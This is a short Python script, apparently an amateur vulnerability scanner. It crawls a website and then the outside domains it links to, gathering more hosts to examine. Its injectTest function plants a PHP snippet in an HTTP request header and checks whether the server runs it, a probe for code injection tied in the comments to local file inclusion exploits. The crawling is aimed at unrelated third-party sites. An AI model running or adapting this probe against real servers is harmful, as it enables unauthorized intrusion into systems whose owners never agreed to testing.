from bs4 import BeautifulSoup, SoupStrainer
from urllib import request
from urllib import parse
from urllib.parse import urlparse


site = "http://www.lawofcode.com/"  # Site to scan for local file inclusion vulnerabilities

def findInternalPages(url):
    """
    Finds all pages internal to "site" and looks for potentially
    dangerous urls. This will then allow us to use injectTest
    to discover if these pages are vulnerable to an LFI exploit.
    """
    headers = {"HTTP_USER_AGENT" : "Mozilla Firefox"}
    req = request.Request(url, headers=headers)
    response = request.urlopen(req)
    soup = BeautifulSoup(response)
    for link in soup.findAll('a'):
        if link.has_attr('href'):
            if urlparse(link['href']).netloc == urlparse(url).netloc or urlparse(link['href']).netloc == '':
                if urlparse(link['href']).scheme == '' or urlparse(link['href']).scheme == 'http':
                    if urlparse(link['href']).path != urlparse(url).path and "/"+urlparse(link['href']).path != urlparse(url).path and urlparse(link['href']).path != '':
                        print(urlparse(link['href']).path)

def findExternalSites(url):
    """
    Searches for sites linked to from "site" and will
    continue the process of searching for potentially
    dangerous urls. 
    """
    externals = []
    headers = {"HTTP_USER_AGENT" : 'Mozilla Firefox'}
    req = request.Request(url, headers=headers)
    response = request.urlopen(req)
    soup = BeautifulSoup(response)
    for link in soup.findAll('a'):
        if link.has_attr('href'):
            if(urlparse(link['href']).netloc != urlparse(site).netloc and "www."+urlparse(link['href']).netloc != urlparse(site).netloc and len(urlparse(link['href']).netloc) > 2):
               if urlparse(link['href']).netloc != '' and urlparse(link['href']).netloc != ' ':
                   externals.append(link['href'])
    return(externals)

def injectTest(url, heads):
    """
    Attempts to trigger a 404 response from the
    webserver with data that contains simple php
    code to echo "yolo". If th word "yolo" appears
    in the document when requested will most
    likely mean that we can successfully inject and
    execute php code on our target server.
    """
    headers = {heads : 'y<?php echo("ol")?>o',
               "HTTP_USER_AGENT" : 'Mozilla Firefox'}
    req = request.Request(url, headers=headers)
    response = request.urlopen(req)
    page = response.read()
    if("yolo" in str(page)):
        print("found in: "+url)


#injectTest(site, "HTTP_ACCEPT")
#findInternalPages(site)
rawLinks = findExternalSites(site)
uniqueLinks = []
for link in rawLinks:
    if urlparse(link).netloc not in uniqueLinks:
        uniqueLinks.append(urlparse(link).netloc)

print(uniqueLinks)
newLinks = []

for link in uniqueLinks:
    print("Checking: "+link+" for links")
    links = findExternalSites("http://"+link)
    for x in links:
        if urlparse(x).netloc not in newLinks and urlparse(x).netloc != '':
            newLinks.append(urlparse(x).netloc)

print(newLinks)



